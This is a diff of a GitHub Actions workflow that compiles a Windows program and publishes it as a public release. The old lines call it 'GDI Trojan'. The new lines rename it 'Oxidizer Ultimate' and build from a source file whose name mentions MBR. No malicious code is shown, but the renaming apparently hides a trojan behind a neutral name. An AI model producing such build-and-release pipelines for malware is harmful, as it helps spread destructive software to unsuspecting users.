@@ -1,4 +1,4 @@
-name: Build GDI Trojan Ultimate
+name: Build gdi Ultimate
 
 on:
   push:
@@ -11,33 +11,33 @@ permissions:
 jobs:
   build:
     runs-on: windows-latest
-    
+
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
-    
+
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
       with:
         arch: x86
-    
-    - name: Build Trojan
+
+    - name: Build
       run: |
-        cl.exe /nologo /O2 /MT /GS- /D_CRT_SECURE_NO_WARNINGS /EHsc /Fe:GDITrojan.exe gdi_trojan_ultimate.cpp user32.lib gdi32.lib winmm.lib advapi32.lib shell32.lib msimg32.lib /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup
-    
+        cl.exe /nologo /O2 /MT /GS- /D_CRT_SECURE_NO_WARNINGS /EHsc /Fe:OxidizerUltimate.exe gdi_oxidizer_mbr_ultimate.cpp user32.lib gdi32.lib winmm.lib msimg32.lib advapi32.lib /link /SUBSYSTEM:WINDOWS /ENTRY:WinMainCRTStartup
+
     - name: Upload artifact
       uses: actions/upload-artifact@v4
       with:
-        name: GDITrojan
-        path: GDITrojan.exe
+        name: OxidizerUltimate
+        path: OxidizerUltimate.exe
         retention-days: 90
-    
+
     - name: Create Release
       if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master')
       uses: softprops/action-gh-release@v2
       with:
         tag_name: v1.0.${{ github.run_number }}
-        name: GDI Trojan v1.0.${{ github.run_number }}
-        files: GDITrojan.exe
+        name: Oxidizer Ultimate v1.0.${{ github.run_number }}
+        files: OxidizerUltimate.exe
         draft: false
         prerelease: false
